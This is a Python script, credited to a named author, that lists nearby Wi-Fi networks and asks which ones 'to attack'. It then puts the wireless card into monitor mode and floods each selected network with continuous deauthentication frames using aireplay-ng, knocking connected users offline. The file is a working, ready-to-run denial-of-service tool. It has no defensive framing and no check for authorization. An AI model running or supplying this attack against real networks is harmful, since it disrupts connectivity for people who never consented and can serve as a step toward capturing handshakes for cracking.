# Mouad Garroud

import subprocess
import pandas as pd
import os
import time
from tabulate import tabulate
import re
import time , os  , pygame
import sys

# check the os 
platform = sys.platform
if 'windows' in platform:
    print("just for linux")
    exit()
    

subprocess.run(["sudo","ifconfig"])
os.system('clear')

#sudo for root permission
if not 'SUDO_UID' in os.environ.keys():
   print("Try running with sudo.")
   exit()


command = "nmcli -f SSID,BSSID,SIGNAL,SECURITY,CHAN,FREQ,RATE dev wifi"
wifi_list = []
i = 1
result = subprocess.run(command, shell=True, capture_output=True, text=True)
lines = result.stdout.splitlines()
for line in lines[1:]:
    parts = re.split(r'\s{2,}', line.strip())
    if len(parts) < 7 or "SSID" in line or "BSSID" in line or "SIGNAL" in line:
        continue
    if len(parts) >= 7: 
        ssid = parts[0]
        mac = parts[1]
        signal = parts[2]
        security = parts[3]
        channel = parts[4]
        frequency = parts[5]
        bitrate = parts[6]
        if security == "--":
            security = "Open"
        elif not security.strip():
            security = "Unknown"
        wifi_list.append({
            'N°': i,
            'SSID': ssid,
            'MAC': mac,
            'Signal': signal,
            'Encryption': security,
            'Channel': channel,
            'Frequency': frequency,
            'Bitrate': bitrate
        })
    i += 1
    time.sleep(1)
df = pd.DataFrame(wifi_list)
df = df.drop_duplicates(subset='MAC')
os.system('clear')
table = df.values.tolist()
headers = ['N°', 'SSID', 'MAC', 'Signal', 'Encryption', 'Channel', 'Frequency', 'Bitrate']
print(tabulate(table, headers, tablefmt="pretty"))
xn = input('Enter the numbers (N°) of networks to attack (comma-separated): ')
selected_numbers = [int(num.strip()) for num in xn.split(',') if num.strip().isdigit()]
selected_networks = df[df["N°"].isin(selected_numbers)]
if selected_networks.empty:
    print('No match found')
    exit()
print("\nSelected Networks Details:")
for index, selected_network in selected_networks.iterrows():
    print(f"SSID: {selected_network['SSID']}, MAC: {selected_network['MAC']}, Channel: {selected_network['Channel']}")
print("\nStarting monitor mode on wlan0...\n")
subprocess.run(["sudo","airmon-ng", "start", "wlan0"])
try:
    for index, selected_network in selected_networks.iterrows():
        hackbssid = selected_network['MAC']
        hackchannel = selected_network['Channel'].strip()
        print(f"\nMonitoring Network SSID: {selected_network['SSID']}, MAC: {hackbssid}, Channel: {hackchannel}\n")
        airodump_proc = subprocess.Popen(["sudo","airodump-ng", "--bssid", hackbssid, "--channel", hackchannel, "wlan0mon"],
                                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(0.3) 
        print(f"Deauthenticating on the network: {selected_network['SSID']} (MAC: {hackbssid})...")
        subprocess.run(["sudo","aireplay-ng", "--deauth", "0", "-a", hackbssid, "wlan0mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # Stop airodump-ng 
        airodump_proc.terminate()
        time.sleep(1)
except KeyboardInterrupt:
    print("\nAttack stopped by user.")
finally:
    subprocess.run(["sudo","airmon-ng", "stop", "wlan0mon"])
    os.system('clear')
